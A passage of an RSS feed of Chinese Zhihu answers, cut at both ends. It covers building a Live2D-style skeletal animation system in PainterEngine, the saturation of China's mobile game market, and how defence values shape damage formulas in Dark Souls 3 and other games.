data-watermark-src=\"v2-5f741dc08aa81f399f5500ff96f247f5\" data-private-watermark-src=\"v2-374b4c95ccc75164824e28b9fba91014\"></p>\n<p>可以看到,每个图层都由一个关键节点进行控制,图层网格中的所有顶点,都围绕着该关键节点进行旋转,平移,伸缩变换,连接这些关键的节点,形成一个正确的骨骼系统</p>\n<p><img src=\"https://pic1.zhimg.com/v2-51e8e41509982e32c63ae146b7b0a6d6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"373\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-51e8e41509982e32c63ae146b7b0a6d6\" data-watermark-src=\"v2-74d486bf69cd0010484302109157ad09\" data-private-watermark-src=\"v2-464a46c99bcd47b7cc555ec15e0738df\"></p>\n<p>在live2D中,骨骼系统满足以下条件</p>\n<p>1.所有的图层都有且只有一个节点</p>\n<p>2.一个节点如果没有父节点,那么这个节点是根节点</p>\n<p>3.一个节点可以有多个子节点,但一个节点最多只能有一个父节点</p>\n<p>4.图层中所有的顶点以节点为参考点进行旋转平移缩放</p>\n<p>5.父节点的任何变换将传递影响影响其所有子节点</p>\n<p>于是,在动画系统中,我们可以通过操作骨骼节点,直接对模型进行动作编辑,它可以等效为一系列矩阵的级联操作-------动画由一系列骨骼节点组成,下一个节点的变换相当于上一个节点的变换加上本节点的变换,相当于一些列矩阵相乘起来,</p>\n<p>简单来说就是</p>\n<p>根节点的变换矩阵---&gt;骨骼节点的变换矩阵---&gt;顶点的变换矩阵--&gt;额外的物理计算矩阵</p>\n<p><img src=\"https://pic4.zhimg.com/v2-68af72b21d87e983b876209953a4e596_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"226\" data-rawheight=\"228\" data-watermark=\"watermark\" data-original-src=\"v2-68af72b21d87e983b876209953a4e596\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>至此,我们依照这个原理将整个模型的骨骼连接起来</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a8b55b3bfd9ac49e359397472678598e_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"396\" data-watermark=\"watermark\" data-original-src=\"v2-a8b55b3bfd9ac49e359397472678598e\" data-watermark-src=\"v2-c107f5f527c28b193b9d2490c146150f\" data-private-watermark-src=\"v2-7e440f55c8bdb2cb4e78297ea03993da\"></p>\n<p>这个时候,这个Live2D动画系统成为了一个正宗的纸娃娃动画系统,通过对骨骼节点的控制,我们就可以实现一个纸娃娃动画了</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fcba8a07169f1faf7ea1b0c0bd166406_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"170\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-fcba8a07169f1faf7ea1b0c0bd166406\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-07f5a75ca31e572c9891a8ada8d56573_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"170\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-07f5a75ca31e572c9891a8ada8d56573\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-754e6246b7ae3e4a3d6183d502f4af73_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"170\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-754e6246b7ae3e4a3d6183d502f4af73\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>当然,当我们实现了一个纸娃娃系统,离live2D已经很接近了,但live2D相较于纸娃娃系统在动画中有更多的细节,你可能已经注意到,在上面的动画中,耳朵与头发有轻微幅度的摆动,这就是live2D中,对于某些顶点在物理上有额外的计算与模拟</p>\n<p>我将它称之为弹性节点,通过对整个模型的平移,你可以很容易观察到弹性节点对于那些柔软的补位是如何进行物理模拟的</p>\n<p><img src=\"https://pic2.zhimg.com/v2-208c8518cda1753447ef7bd45e061c6c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"274\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-208c8518cda1753447ef7bd45e061c6c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>首先我们知道,每个图层的网格由若干个顶点控制,每个顶点互相连接</p>\n<p><img src=\"https://pic2.zhimg.com/v2-63937c247223e5e21c62b93c02f0db5f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"276\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-63937c247223e5e21c62b93c02f0db5f\" data-watermark-src=\"v2-3fb0645383d9c829b75e074300040152\" data-private-watermark-src=\"v2-5f6c4b4fedacc76fb996263053f438e9\"></p>\n<p>那么我们可以认为,对于那些弹性顶点,和静态顶点直接由一个可以视作一个弹簧连接,这样,我们可以直接给出弹性系数,来指定该顶点在动画中的运动规律,注意的是,这里的弹性系数和弹簧的弹力公式中的系数并不一致,为0表示这是一个静态顶点(刚体)</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ca9ad212d85a03034f06535ad050f6e6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-ca9ad212d85a03034f06535ad050f6e6\" data-watermark-src=\"v2-5dd98735f4b7f34845955eb0e84bd510\" data-private-watermark-src=\"v2-884642c18bc61f37de3b43fa96e779c5\"></p>\n<p>但多顶点之间级联会导致顶点运算变得非常复杂,因此,我们可以简化上述流程,视作每一个顶点与图层节点相连,距离节点越远,弹性系数越大,同时,运动过程中的阻力衰减也越弱</p>\n<p><img src=\"https://pic2.zhimg.com/v2-21645700bdaf649fcc22fc294aaba036_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"379\" data-rawheight=\"273\" data-watermark=\"watermark\" data-original-src=\"v2-21645700bdaf649fcc22fc294aaba036\" data-watermark-src=\"v2-2c832be1f2b0bcb35add8adf73a66e64\" data-private-watermark-src=\"v2-acd067c3c42afc4b429fc864caafa7fe\"></p>\n<p>那么,剩下我们要做的,就是为这个弹力公式挑选一个合适的数学模型了.关于这部分,你可以在PainterEngine Live的代码中找到,笔者就不再进一步讨论了</p>\n<p>到这里,有了纸娃娃动画,有了弹性节点,我们终于迎来了制作Live2D最后一个功能,我管它叫动作追踪(Action Tracer)</p>\n<p>顾名思义,就是能够依据某个输入,完成某一类追踪类动作,例如,下面是一个非常简单的追踪例子,人物跟随着鼠标的运动进行运动,当然,鼠标的运动可以和机器识别相结合,绑定在摄像头中人人物进行联动</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9f8a063155b37f64e256fe1db300465b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"322\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-9f8a063155b37f64e256fe1db300465b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>尽管我们的模型仍然是由一系列的二维图片组成,但3D渲染器的投影变换仍然能够给予我们足够的启发来完成这个让2D图像看起来像3D的功能</p>\n<p>例如在上面的例子中,我们可以想象脸部的纹理贴在了一个类似于球面的曲面上,当我们尝试旋转这个球体的时候,当3D顶点坐标投影到2D坐标上时,我们可以近似认为这个坐标在保持u,v纹理坐标不变的情况下,在x,y方向上被压缩了</p>\n<p>例如,下面的动画是以整个模型进行变换的(仅作为示范,其动画并不准确)</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0907d584e38ebe61bef89523352510d_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"193\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-c0907d584e38ebe61bef89523352510d\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它能够实现小幅度的整体脸部及身体旋转功能,当然,商用的live2D有着更多的计算来完成这种效果,但对于我们这个简单版本的live2D,倒也足够了</p>\n<p>最后说个后记</p>\n<p>制作整个Live2D的核心渲染,骨骼框架和额外的弹性模拟与曲面贴图,其代码并不复杂大约在2-3k行左右,大约2周时间就完成了,但Live2D的配套的Editor占据了剩下5个月的所有时间</p>\n<p>真是配套设施比核芯功能还折腾的多,你可能以为笔者要开始吹一吹在这世间学到了什么,实际上并没有,它涉及的知识,似乎就是你在本科时爱看不看的&lt;&lt;计算机图形学&gt;&gt;里的那堆东东,比起笔者老本行的语音信号处理和nlp里那些折磨人的玩意,实在是友好的多.</p>\n<p>当然,上面的所有代码,都已经开源了,你可以在<a href=\"http://link.zhihu.com/?target=http%3A//PainterEngine.com\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">PainterEngine.com</span><span class=\"invisible\"></span></a>中找到editor和PainterEngine Live2D的所有核心和配套源代码</p>\n<p>如果你喜欢这个项目,别忘了给笔者一个star</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//github.com/matrixcascade/PainterEngine\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-f26abff5fc616b03879682ee5c926359_bh.jpg\" data-image-width=\"1200\" data-image-height=\"600\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">matrixcascade/PainterEngine</a><a href=\"http://link.zhihu.com/?target=http%3A//painterengine.com/\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">PainterEngine 一个由C语言编写的完整开源的跨平台图形应用框架</a><p>最后,随便做的一个live2D动画做结尾吧</p>\n<p><img src=\"https://pic2.zhimg.com/v2-02a41be961c1dc596b6d30e550106003_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"193\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-02a41be961c1dc596b6d30e550106003\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/DBinary?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">DBinary</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/374369010/answer/1954527067?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/268017572?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">学动画的，想要手绘板？</a><br><a href=\"http://www.zhihu.com/question/398759795?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">我想学2d原画动画，请问我是要去学校还是自学？</a><br>\n","link":"http://www.zhihu.com/question/374369010/answer/1954527067?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"手游市场饱和了吗？以后游戏的增量在哪里？","date":"2021-06-21 15:30:09","description":"\n<p>这个问题非常好，题主老哥有点东西。</p>\n<p>-</p>\n<p>市场有没有饱和？<b>简单的答案是没有</b>——但这个答案是个抖机灵的说法，因为很难说存在一个完全饱和的市场。我们还是拿App Annie的数据做一个比较简单的benchmark。</p>\n<p>首先是收入状态。</p>\n<p>过去12个月YoY对比，可以看到的情况，参照下方的颜色标识，从收入来看，全球范围基本都在增长，但是中国市场的增长率反而是有下降的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a69a8eee18c651a97f96f449aa3abde2_720w.jpg?rss\" data-rawwidth=\"2390\" data-rawheight=\"1336\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a69a8eee18c651a97f96f449aa3abde2\" data-watermark-src=\"v2-747bf4d0fd41ab1247868afa47e7ae33\" data-private-watermark-src=\"v2-0e60dc677b3dfe35e29424f797b16f7a\"></p>\n<p>而下载量的情况来看，中国区的下载量下降是更多的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3a2d6013b99f672312a5927b730c5401_720w.jpg?rss\" data-rawwidth=\"2404\" data-rawheight=\"1308\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3a2d6013b99f672312a5927b730c5401\" data-watermark-src=\"v2-7c2141df4863c70118598011c47ce3c5\" data-private-watermark-src=\"v2-dfb65fda4238b17f5734e300240cf25c\"></p>\n<p>本身，<b>AppAnnie的数据从数值上来说可信度有限</b>，但是从变化和大盘看总体趋势是没有太大问题的。</p>\n<p>虽然说AppAnnie在中国区没有安卓的数据，但近几年从经验来看，AppAnnie上苹果量与实际上的中国区域安卓量基本存在正相关关系。安卓区的下载或者收入，并不会让这个数字变动太多。</p>\n<p>而移动市场的红利其实也在过去几年被释放得比较明显。从下图可见，未来几年的新用户增加不会太多。而纯移动用户转换到游戏付费用户的比例还会更低。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a2f358c503805caaac0a7e7b3ca1d1f_720w.jpg?rss\" data-rawwidth=\"1250\" data-rawheight=\"1222\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9a2f358c503805caaac0a7e7b3ca1d1f\" data-watermark-src=\"v2-3ea7b93b14d2ca635c5ef0afb0434181\" data-private-watermark-src=\"v2-c3113c04343f29c5348c3891e4302447\"></p>\n<p>从这里，我们可以稍微复读两点。</p>\n<ul>\n<li>\n<b>数据显示，中国游戏市场增长有限。</b>如果相信AppAnnie的数据，那么在过去12个月里，同比增长较少；相信伽马的数据，那增长也就在5%左右——对于一个自诩新兴的行业而言，5%的年增长都不算很高。</li>\n<li>网民，即新增用户群的增长在未来看来，也是相对有限的。将增长希望寄托于国内用户的新增，是相对不现实的。</li>\n</ul>\n<p>当然，我们也可以拿新增人口说事儿。毕竟现在小孩子都是digital native。那么我们可以看一下国内的出生人口情况。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e915b5af876a70e0ec5d74d50b87ae26_720w.jpg?rss\" data-rawwidth=\"1686\" data-rawheight=\"1058\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e915b5af876a70e0ec5d74d50b87ae26\" data-watermark-src=\"v2-a997475a1fe367942fc47f543cf96e2e\" data-private-watermark-src=\"v2-6fb6e03829119a59c6fc547f31a11012\"></p>\n<p>那么，以有独立付费能力作为起始点，即18岁成年；玩家转化率设定为80%（绝对乐观的比值）的情况下，在未来十多年时间里，每年会有大约12-15m的新玩家增加到市场上——看起来数字不错，但考虑到目前中国广义的移动玩家有6-7亿，那么每年新用户增长只有2.5%甚至更少，这并不是个非常乐观的状态。</p>\n<p>付费的提升有可能吗？在单款游戏上是有可能的。但每个人的付费总预算是有限的，在原神上花的多，在其他游戏上花的相对就会减少。自然有土豪，但行业不能指望土豪。因此ARPU我认为有增长，但是增长速度不会太乐观。</p>\n<p>-</p>\n<p>仅从中国市场的情况来看，基本上我们现在就可以给出一个结论，<b>中国本土游戏市场的增长几乎到顶，未来来看增长潜力已经不多。</b>但如果我们对中国游戏行业有足够多的观察，很容易看到很多相反的现象：游戏投资火热，新项目层出不穷，从业人员工资水涨船高，等等。</p>\n<p>这个现象有两个原因，第一个原因，我将其称为因为高质量游戏产品带来的消费力的释放。</p>\n<p>简而言之，单个高变现效率产品，如《原神》等，增加了更广泛玩家的付费上限：游戏本身在移动游戏同侪中较高的质量，让他们能够以比竞争对手更便宜的价格获取更多的玩家；“二次元群体”（这个词的说法可以再做商榷）本身社群的同温层效应，则造成了更高的充值激励。此外，移动支付的愈发成熟，抽卡模式的高单价和低出货率，客观上的赌博性质也让游戏的付费获得了较高的提升。</p>\n<p>第二个原因则是因为一级市场的反应后置和投资者的kpi压力。游戏投资的火热背后，是大量行业投资的低迷。游戏行业因为存在符合原因一里的多款明星产品，所以以风险投资的性质来看，愿意往这个行业冒险。</p>\n<p>-</p>\n<p><b>VR是增长点吗？</b>很难说。因为VR设备每年全球增量还是极其有限。VR的软件相对而言体验普通，且消费模式还是传统的Premium收费。这样的模式可以养活不少开发商，但能够变现的想象力不多。</p>\n<p><b>而对我来说，Metaverse是骗子概念。</b></p>\n<p>-</p>\n<p>唱衰半天，我觉得游戏行业并非没有增长点。</p>\n<p><b>增长点在哪？</b>以我的个人判断，出海仍然是非常重要的增长点。还是以上面几个图来看，无论是新兴市场的东南亚，拉美，中东，还是传统来看已经饱和的欧美市场，其实都还是有很高的增长率。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a1f2e22d6f8079ca104b725ae7b37e62_720w.jpg?rss\" data-rawwidth=\"1732\" data-rawheight=\"702\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a1f2e22d6f8079ca104b725ae7b37e62\" data-watermark-src=\"v2-f102b46582fb14716aa8efe00c5563ea\" data-private-watermark-src=\"v2-2e53090feba5bb62aad877a2c1d35289\"></p>\n<p>上图是我年初拉的AppAnnie数据，基本上中国大陆以外的收入/下载增长都有可观的市场。而国内厂商真正在海外占据上风的品类只有SLG。其他品类偶有成功的作品，但没有完全占据优势的品类。</p>\n<p>具体而言，欧洲和拉美是非常值得注意的市场，放几页ppt（我自己做的），都是公开数据。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-be7e84a017a7715f42366daaa4fdc18d_720w.jpg?rss\" data-rawwidth=\"1808\" data-rawheight=\"972\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be7e84a017a7715f42366daaa4fdc18d\" data-watermark-src=\"v2-4ed0005064bb73c9e3e6177c5e0745df\" data-private-watermark-src=\"v2-dea737fb40db42e678c849f490cd8f78\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-64b3e3845c4a76feb773b5c5e87b41f3_720w.jpg?rss\" data-rawwidth=\"1868\" data-rawheight=\"944\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64b3e3845c4a76feb773b5c5e87b41f3\" data-watermark-src=\"v2-a797cf074a148b24e59d08a0b05b76f2\" data-private-watermark-src=\"v2-e0bae8f47e0f38c4f6f8a8a40eef7635\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-65f0da69fa5e51c26d9c576b7ae962d0_720w.jpg?rss\" data-rawwidth=\"1834\" data-rawheight=\"972\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-65f0da69fa5e51c26d9c576b7ae962d0\" data-watermark-src=\"v2-ca9e876370532ab81286544b126fd542\" data-private-watermark-src=\"v2-f6f60f9a0eb7e40dca409b06bd8d010a\"></p>\n<p>-</p>\n<p>当然，出海好不好做又是另外一个故事了。这个回答里恕不覆盖这部分。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/465199201/answer/1947786674?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465199201/answer/1947786674?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/332102031?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么国内游戏行业觉得给适合他们的市场，适合他们的政策，甚至适合他们的玩家之后，他们就能做出一流游戏？</a><br><a href=\"http://www.zhihu.com/question/47963469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">手游的市场到底有多大啊？</a><br>\n","link":"http://www.zhihu.com/question/465199201/answer/1947786674?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"【深入理解魂系列】为什么计算伤害时要考虑防御力？","date":"2021-06-21 03:00:10","description":"\n<p>伤害是很多游戏中绕不过去的一环，毕竟只有对敌人造成伤害，才能最终击杀敌人，赢得胜利。那伤害是如何计算的呢？伤害和攻击力是一回事吗？一般来讲，攻击力是指玩家所具有的一个属性或者一次攻击所具有的属性，而伤害则是这次攻击实际所能造成的血量削减，这两者之间，还差了一个<b>防御力</b>。</p>\n<p>没错，防御力，这就是关键。<b>假设</b>我们的攻击力是100，敌人的防御力是20，伤害公式是普通的减法，那么伤害就是100-20=80。正是防御力让攻击力和伤害有所区别，这就是本文的核心：防御力到底是用来干什么的，为什么需要有防御力？</p>\n<p>防御力以及类似的概念广泛存在于不同的游戏中，但是往往有不同的称呼：防御力，减伤率，抗性……为了统一，以及为了避免与某个具体游戏中的相关概念混淆，接下来我会用一个很别扭的词来表达广义的防御力概念，\"<b>抵抗能力</b>\"。这只是随便给的一个词而已，别扭是因为不别扭的词都被各种游戏用过了，不用太纠结。</p>\n<p>接下来，就让我们一同探索抵抗能力的本质吧。</p>\n<hr>\n<h2>穿上你的护甲</h2>\n<h3>抵抗能力的出现是合乎逻辑的</h3>\n<p>在很多ARPG游戏中，主角是可以拥有护甲的，效果是让主角更耐揍。那么，\"更耐揍\"这一点应该如何体现出来呢？也许可以是增加血量上限，但是由此一来，恢复生命值的药剂应该如何处理，是否应该增加恢复量？当主角卸下护甲之后，生命值又应该如何处理呢？</p>\n<p>这些问题属实不好处理，所以我们干脆把攻击力和伤害分开，在两者中间插入一个抵抗能力，来体现护甲的作用。</p>\n<p>这样看来，抵抗能力的出现是合情合理的，这是体现护甲作用的符合直觉的方式。</p>\n<h3>但是这不一定是抵抗能力在现代游戏中的意义</h3>\n<p>这是抵抗能力的起源，但不一定是它现在的意义。</p>\n<p>如今的游戏中，伤害公式多种多样，如果只是为了体现护甲的作用，真的有必要搞出这么多不同的东西吗？可见，抵抗能力在现代的游戏中，还有更多的作用。</p>\n<p>别着急，我们接着往下说。</p>\n<hr>\n<h2>抵抗能力的本质</h2>\n<h3>本质是约束攻击力成长的收益</h3>\n<p>抵抗能力的本质，就是在约束攻击力成长的收益。</p>\n<p>攻击力本身的提升十分复杂，可以是人物属性、装备、buff等各种来源，难以进行平衡。但是，玩家提升攻击力的最终目标是造成伤害。那么制作组就可以走一个捷径，不用费尽心力调整攻击力的提升，而是直接利用插在攻击力和伤害之间的这个抵抗能力，来约束攻击力成长的收益。</p>\n<p>而不同的伤害公式，其实就体现出不同游戏对于攻击力成长收益的不同约束目标。</p>\n<h3>不同游戏有不同的选择</h3>\n<p>接下来，我们就看一下不同游戏中的一些典型伤害公式，体会它们是如何与游戏的定位相符合的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-fdbb29992cc689abb4fa283bba688cb1_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-fdbb29992cc689abb4fa283bba688cb1_r.jpg\"><figcaption>盐和避难所 (示意图，仅表示趋势)</figcaption></figure><p>最简单的例子，盐和避难所，完全的线性。具体而言，敌人具有减伤率，直接用攻击力乘(1-减伤率)就可以得到伤害。为什么盐要使用纯线性的伤害公式呢？因为制作组只有两个人，费力去调整伤害公式的平衡，找到一个合适的约束，实在太麻烦，那不如干脆不设约束。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-dcefd9c1249995f21091d2926a8659e1_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-dcefd9c1249995f21091d2926a8659e1_r.jpg\"><figcaption>明日方舟 (示意图，仅表示趋势)</figcaption></figure><p>明日方舟里面有两种公式，一个和盐一样是纯线性，另一个则近似于直接做减法。可以看到，减法公式使得攻击力提升的收益在一开始非常低，而超过敌人的防御力之后，又变成完全的线性，且没有任何削减，提高多少攻击力，就可以提高多少伤害。可以说，减法公式和乘法公式是两个极端，前者是对比最强烈的\"前慢后快\"式收益，后者则是完全的线性。我想这种设计是因为舟是一个手游，不应该做过于复杂的公式，但是又希望体现出物理和法术区别，产生一定的策略性，所以选择了最极端的两种公式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f57d5f32949d6064455fdd768e48bfe5_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-f57d5f32949d6064455fdd768e48bfe5_r.jpg\"><figcaption>黑暗之魂3 (示意图，仅表示趋势)</figcaption></figure><p>魂3里面的公式则是对减法公式的优化。同样的前慢后快，但是变动更加平滑，划分出更多区间。这种上不设限的成长模式说明，魂系列终究是一个ARPG，玩家遇到困难的时候有各种手段去克服，除了练技术之外，使劲堆攻击力也是被制作组鼓励或者至少允许的做法。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bcce8311c902847547d7cf7cc26781f3_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic4.zhimg.com/v2-bcce8311c902847547d7cf7cc26781f3_r.jpg\"><figcaption>仁王2 (示意图，仅表示趋势)</figcaption></figure><p>而仁王就不一样了，两头都比较慢，只有中间增长快。这是因为仁王有动作游戏的心，不希望玩家这么轻易地秒杀boss，所以给攻击力的成长增加了一个天花板。</p>\n<p>从上面的例子中，我们可以看出，不同的伤害公式，的确可以将攻击力成长的收益约束为不同的模式，以适应游戏本身的需求。</p>\n<h3>小结</h3>\n<p>现在我们知道，抵抗能力的本质并不是简单地让攻击力受到削减，而是<b>将攻击力成长的收益约束为制作组希望的模式</b>。</p>\n<p>那么，作为玩家，我们在接触一款新游戏时，对其伤害公式的理解也应该循序渐进，从最核心的定位开始。一上来，我们不需要去关注细节，我们只要看看伤害公式的曲线形态，就可以了解到制作组希望约束出的成长模式。等到我们需要具体进行计算来帮助决策的时候，我们才要去看具体的公式。</p>\n<hr>\n<h2>魂3的细节</h2>\n<p>这篇文章是深入理解魂系列，所以我们回到魂3，看看更多细节。上一部分中举的魂3的例子，其实省略了很多东西，并不是魂3伤害公式的全貌。</p>\n<h3>多种攻击力属性</h3>\n<p>作为一款ARPG游戏，魂3自然也设置了不同的攻击力属性，物理中分成标准、突刺、斩击、打击，非物理中分成火、暗、雷、法。</p>\n<h3>自然，敌人应该存在属性弱点与强项</h3>\n<p>设置了这么多不同的攻击力属性，总不能光听个响看个特效吧？</p>\n<p>很显然，我们会希望<b>敌人具有属性弱点与强项</b>。比如一个重甲骑士，就应该对斩击有更强的抵抗能力，但是打击就是他的弱点所在。</p>\n<p>那么，这种弱点与强项，应该如何体现呢？</p>\n<h3>用减伤率来体现</h3>\n<p>上面展示的前慢后快的增长，在魂3中是用\"<b>防御力</b>\"来体现的，并且不同增长区间的划分依赖于<b>玩家攻击力与敌人防御力的比值</b>。那么，防御力可以用来实现弱点与强项吗？理论上可以，但是实际不太合适，因为这种收益递增的模式再加上以比值作为区间划分依据，不容易把握平衡，一不小心就可能出现大差错。所以FS不敢用防御力来区分属性弱点与强项，他们只能把一个敌人对不同属性的防御力设置得很接近，只有一点点差别。</p>\n<p>那应该如何体现弱点与强项呢？不如换用一个更简单、更容易控制平衡的收益模式，也就是盐那种<b>完全线性</b>的模式。所以，魂3中与抵抗能力有关的属性，除防御力之外，还有一项<b>减伤率</b>。减伤率的作用就是用简单粗暴的方式区分出敌人的属性弱点与强项。</p>\n<p>例如，如果我们把敌人对两个属性的防御力设置成100和200，那最后实际打出来的伤害可能乱七八糟的，很难控制。但是如果把减伤率分布设置成0.2和0.6，那就可以很简单地前者的有效性是后者的两倍。这样一来，做数据平衡时的难度就低多了。</p>\n<p>所以，我们在魂3中真正看到的伤害公式，其实<b>一共经历了两次削减</b>。第一次削减用<b>防御力</b>，目的是约束攻击力成长收益，让它呈现出<b>收益递增的模式</b>。第二次削减用<b>减伤率</b>，目的是用一个简单的纯线性收益模式来<b>区分敌人的属性弱点与强项</b>。</p>\n<p>之前我讲魂3伤害公式的时候，基本就是按照公式本身一项一项地介绍，观众也看得一头雾水，但是现在，我们知道魂3设置两次削减的目的是什么，自然也就可以理解为什么防御力和减伤率会存在这种计算方式的差异。</p>\n<hr>\n<p><b>抵抗能力的意义，就在于让制作组能够将攻击力成长的收益约束为自己希望的模式。我们理解伤害公式的时候，也应该首先关注这一目的，而不是具体的细节。</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这篇文章的逻辑感觉比较突兀，直接把我的观点摆出来，缺少逐渐引出的过程。之后转化为视频的时候，可能还需要进行更多设计。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/darkbblue?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Darkbblue</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" 